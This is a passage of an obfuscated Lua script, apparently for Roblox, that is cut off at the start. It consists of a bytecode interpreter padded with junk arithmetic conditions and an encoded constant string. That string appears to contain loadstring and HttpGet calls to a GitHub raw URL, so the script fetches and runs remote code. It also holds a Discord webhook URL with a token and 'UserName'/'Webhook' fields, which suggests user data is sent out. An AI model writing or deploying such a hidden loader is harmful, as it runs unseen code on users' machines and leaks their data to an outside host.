88))) or (1332>(1593 + 1935))) then while true do if (((1489 -(513 + 58))==(2649 -(678 + 1053))) and (v190==((0 -0) + 0))) then v191=v90[2 + (0 -0) ];do return v13(v88,v191,v76);end break;end end break;end end else local v192=0 -0 ;local v193;local v194;local v195;while true do if ((v192==2) or ((2925 + 1093)==(3197 -1644))) then for v229=1855 -(1343 + 511) ,v90[5 -1 ] do local v230=0 + 0 ;local v231;while true do if ((v230==(396 -(321 + 74))) or ((4497 -(351 + 765))==(360 + 349))) then if ((3192<=(4464 + 492)) and (v231[1063 -(256 + (2163 -1357)) ]==(41 -26))) then v195[v229-(1 + 0) ]={v88,v231[6 -3 ]};else v195[v229-1 ]={v36,v231[8 -5 ]};end v87[ #v87 + 1 + 0 + 0 ]=v195;break;end if (((4559 -3373)<4348) and ((0 -0)==v230)) then local v263=212 -(199 + 13) ;while true do if ((v263==(2 -1)) or ((9426 -4680)<=(2280 -(594 + 980 + 215)))) then v230=1 -0 ;break;end if (((285 -134)<=(6386 -3223)) and (v263==(991 -(36 + 955)))) then v75=v75 + (1399 -((1764 -807) + 441)) ;v231=v82[v75];v263=2 -1 ;end end end end end v88[v90[2]]=v29(v193,v194,v37);break;end if (((843 -294)==((4572 -3195) -828)) and (0==v192)) then local v227=0 + 0 ;while true do if (((4740 -(81 + 249))>2776) and (v227==(1321 -(477 + 844)))) then v193=v83[v90[1 + 2 ]];v194=nil;v227=(2 -1) -0 ;end if (((1280 + 873 + 207)>(3492 -2105)) and (v227==(2 -1))) then v192=1;break;end end end if ((v192==1) or ((1383 + 1316 + 1861)<(2190 -((1912 -1347) + 341)))) then local v228=(942 -(848 + 94)) -0 ;while true do if ((v228==(1 + 0)) or (4662<=(2507 -(2 + 406 + 45 + 523)))) then v192=667 -(391 + 274) ;break;end if ((v228==(0 -0)) or (((48 -32) + 123)<=(1599 -(123 + 1388)))) then v195={};v194=v10({},{__index=function(v264,v265)local v272=0 + 0 ;local v273;while true do if ((v272==(0 -0)) or (3250>(6225 -((1691 -497) + 210)))) then local v308=0 + 0 ;while true do if ((((1853 -(14 + 3)) -783)<(94 + 2890)) and (v308==(630 -(194 + 436)))) then v273=v195[v265];return v273[(1183 -(236 + 945)) -1 ][v273[5 -3 ]];end end end end end,__newindex=function(v266,v267,v268)local v274=0;local v275;local v276;while true do if ((v274==((960 -(351 + 609)) -0)) or ((16065 -11885)==1360)) then v275=0 + 0 ;v276=nil;v274=1772 -(1043 + 728) ;end if ((v274==1) or (915<=(284 + 27))) then while true do if ((v275==(0 -0)) or (2563>=(7295 -(4668 -(251 + 1194))))) then v276=v195[v267];v276[1][v276[580 -(348 + (429 -(167 + 32))) ]]=v268;break;end end break;end end end});v228=177 -(75 + 101) ;end end end end end elseif (((2513 + 2317)>=(22585 -17983)) and (v91<=(916 -(779 + 106)))) then local v196=(531 + 347) -(325 + 553) ;local v197;local v198;local v199;while true do if (((215 + 813)<(2520 -(691 + 233))) and (v196==(0 -0))) then v197=0;v198=nil;v196=641 -(143 + 137 + 360) ;end if ((v196==(703 -(214 + 488))) or ((4989 -(387 + (1225 -839)))<=3657)) then v199=nil;while true do if ((v197==(565 -(143 + 421))) or ((5924 -1859)<(3236 -(839 + 16)))) then while true do if (((3370 -1288)>=(28 + 0)) and (v198==(1976 -(1036 + 940)))) then v199=v90[2];v88[v199]=v88[v199](v13(v88,v199 + 1 + 0 ,v76));break;end end break;end if ((v197==(799 -(15 + 91 + 693))) or (3218<(1835 -376))) then v198=0;v199=nil;v197=1658 -(1207 + 450) ;end end break;end end elseif ((v91>(70 -38)) or (1836>=(49 + 2792))) then v75=v90[7 -4 ];else local v210=0 -0 ;local v211;local v212;local v213;local v214;local v215;while true do if (((15 + 2807)>(1632 + 277)) and (v210==(2 -1))) then v213=nil;v214=nil;v210=2 + (1034 -(9 + 1025)) ;end if ((v210==((0 -0) + 0)) or ((2315 -((2290 -(1209 + 667)) + 411))>=3997)) then v211=942 -(437 + 505) ;v212=nil;v210=1;end if ((v210==(2 + 0)) or ((2365 -((65 -30) + 528))==(9517 -5073))) then v215=nil;while true do if ((1566==(7392 -5826)) and (v211==1)) then local v277=0;while true do if (((814 + 159)==(1931 -(723 + 235))) and ((0 + 0)==v277)) then v76=(v214 + v212) -1 ;v215=(1219 + 529) -(635 + 1113) ;v277=1 + 0 ;end if ((v277==(1 + 0 + 0)) or (1640<(502 -(353 + 88)))) then v211=1 + 1 ;break;end end end if (((921 -(51 + 538))>(1744 -(535 + 922))) and (v211==(0 -0))) then v212=v90[4 -2 ];v213,v214=v85(v88[v212](v13(v88,v212 + (1 -0) ,v90[1146 -(874 + 269) ])));v211=2 -1 ;end if ((v211==2) or ((6337 -2389)<=(794 + 756))) then for v290=v212,v76 do local v291=(0 -0) -0 ;while true do if ((v291==(0 -0)) or ((4723 -3486)>=(2823 -(418 + 421)))) then v215=v215 + (1 -0) + 0 ;v88[v290]=v213[v215];break;end end end break;end end break;end end end v75=v75 + 1 ;break;end end break;end end break;end end end end A,B=v27(v11(v79));if  not A[1] then local v92=0;local v93;while true do if (0==v92) then v93=v35[4][v75] or "?" ;error("Script error at ["   .. v93   .. "]:"   .. A[2] );break;end end else return v13(A,2,B);end end;end return v29(v28(),{},v17)(...);end v15("LOL!1B3O00028O00027O004003053O007461626C6503063O00696E73657274026O000840026O001040030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403323O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F507378302F412F6D61696E2F6D61696E026O00F03F03053O0062697433322O033O0062697403043O0062786F7203063O00636F6E63617403063O00737472696E6703043O006368617203043O00627974652O033O0073756203083O00557365724E616D65030C3O000CBDF4D12BB5F3D428A6B0A403043O0044D2809503093O00557365724E616D6532030C3O0092C734E122BDDB01C939EA9A03053O00DAA840A54D03073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F31303934313O383938323036333539362O322F4E6B5752393475742O45775468456D4C74683658497778524E4A4D70354376357341574C4574595F78686D4378594F7A706C4F4E552O6D5675716455565A70322O754F43003F3O0012013O00014O0008000100083O0026113O000F000100020004213O000F0001001209000900033O0020100007000900042O0008000800083O00061D00083O000100062O000F3O00064O000F3O00074O000F3O00014O000F3O00054O000F3O00024O000F3O00033O0012013O00053O0026113O001A000100060004213O001A0001001209000900073O001209000A00083O002016000A000A0009001201000C000A4O0013000D00014O0020000A000D4O001F00093O00022O00170009000100010004213O003D00010026113O00240001000B0004213O002400010012090009000C3O00060700040020000100090004213O002000010012090004000D3O00201000050004000E001209000900033O00201000060009000F0012013O00023O002O0E0001002D00013O0004213O002D0001001209000900103O002010000100090011001209000900103O002010000200090012001209000900103O0020100003000900130012013O000B3O0026113O0002000100050004213O000200012O000F000900083O001201000A00153O001201000B00164O00190009000B000200120B000900144O000F000900083O001201000A00183O001201000B00194O00190009000B000200120B000900173O0012010009001B3O00120B0009001A3O0012013O00063O0004213O000200012O00158O00053O00013O00013O00033O00028O00026O00F03F026O00704002473O001201000200014O0008000300043O00261100020040000100020004213O00400001001201000500013O00261100050005000100010004213O00050001002O0E0002000D000100030004213O000D00012O000300066O000F000700044O0012000600074O001E00065O00261100030004000100010004213O00040001001201000600013O00261100060037000100010004213O003700012O001C00076O000F000400073O001201000700024O001800085O001201000900023O00040A0007003600012O0003000B00014O000F000C00044O0003000D00024O0003000E00034O0003000F00044O0003001000054O000F00116O000F0012000A3O00201B0013000A00022O0020001000134O001F000F3O00022O0003001000044O0003001100054O000F001200013O00200C0013000A00022O0018001400014O000400130013001400101A00130002001300200C0014000A00022O0018001500014O000400140014001500101A00140002001400201B0014001400022O0020001100144O000600106O001F000E3O000200200D000E000E00032O0002000D000E4O0014000B3O000100042O000700180001001201000600023O00261100060010000100020004213O00100001001201000300023O0004213O000400010004213O001000010004213O000400010004213O000500010004213O000400010004213O00460001002O0E00010002000100020004213O00020001001201000300014O0008000400043O001201000200023O0004213O000200012O00053O00017O00473O00103O00113O00143O00143O00163O00183O00183O00193O00193O001A3O001A3O001A3O001A3O001C3O001C3O001D3O001F3O001F3O00203O00203O00213O00213O00213O00213O00223O00223O00223O00223O00223O00223O00223O00223O00223O00223O00223O00223O00223O00223O00223O00223O00223O00223O00223O00223O00223O00223O00223O00223O00223O00223O00223O00223O00223O00213O00243O00263O00263O00273O00283O00293O002C3O002D3O002E3O00303O00323O00323O00333O00343O00353O00363O00383O003F3O00023O00033O000C3O000C3O000D3O000D3O000E3O00383O00383O00383O00383O00383O00383O000F3O00393O003B3O003B3O003C3O003C3O003C3O003C3O003C3O003C3O003C3O003C3O003D3O003F3O003F3O00403O00403O00403O00403O00413O00423O00423O00433O00453O00453O00463O00463O00473O00473O00483O00483O00493O004B3O004B3O004C3O004C3O004C3O004C3O004C3O004D3O004D3O004D3O004D3O004D3O004E3O004E3O004F3O00503O00513O00523O00",v9(),...);end